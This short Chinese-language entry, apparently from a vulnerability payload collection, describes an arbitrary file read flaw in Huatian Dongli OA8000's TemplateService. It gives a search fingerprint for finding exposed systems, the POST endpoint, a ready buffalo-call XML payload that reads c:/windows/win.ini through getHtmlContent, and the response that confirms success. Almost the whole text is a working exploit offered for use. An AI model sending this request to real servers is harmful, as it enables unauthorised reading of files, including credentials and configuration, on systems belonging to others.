# 华天动力OATemplateService任意文件读取

华天动力OATemplateService ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="华天动力-OA8000"`
- **请求**：`POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1`

**Payload**
```
<buffalo-call>
<method>getHtmlContent</method>
<string>c:/windows/win.ini</string>
</buffalo-call>
```
- **响应特征**：200 support